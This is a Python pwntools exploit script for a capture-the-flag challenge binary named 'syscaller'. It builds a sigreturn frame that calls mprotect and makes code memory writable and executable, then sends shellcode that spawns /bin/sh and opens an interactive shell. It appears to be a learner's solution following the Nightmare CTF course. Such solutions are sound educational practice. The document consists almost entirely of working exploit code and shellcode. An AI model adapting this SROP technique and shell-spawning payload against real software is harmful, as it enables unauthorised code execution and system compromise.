from pwn import *

target = process('./syscaller')
# gdb.attach(target, gdbscript='b *0x0040011e')

# Specify the architecture
context.arch = 'amd64'

## add write rights in memory region

# stack frame
mprotect_frame = SigreturnFrame()

# set return pointer to a syscall
mprotect_frame.rip = 0x400104

# set the values to trigger a write syscall that will print the flag
mprotect_frame.rax = 0xa  # mprotect
mprotect_frame.rdi = 0x400000  # start
mprotect_frame.rsi = 0x1000  # length
mprotect_frame.rdx = 0x7  # write rights
mprotect_frame.rsp = 0x40011a  # beginning of the multipop syscall to overwrite later

payload = b''
payload += p64(0x0)  # R12 = junk
payload += p64(0x0)  # R11 = junk
payload += p64(0x0)  # RDI = junk
payload += p64(0xf)  # RAX = sigret
payload += p64(0x0)  # RBX = junk
payload += p64(0x0)  # RDX = junk
payload += p64(0x0)  # RSI = junk
payload += p64(0x0)  # RDI = junk

payload += bytes(mprotect_frame)

target.sendline(payload)

# without it it will fail (Nightmare says I/O purpose), but I don't know when to put it exactly :/
input('Just hit enter: ')

shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
target.sendline(shellcode)

target.interactive()
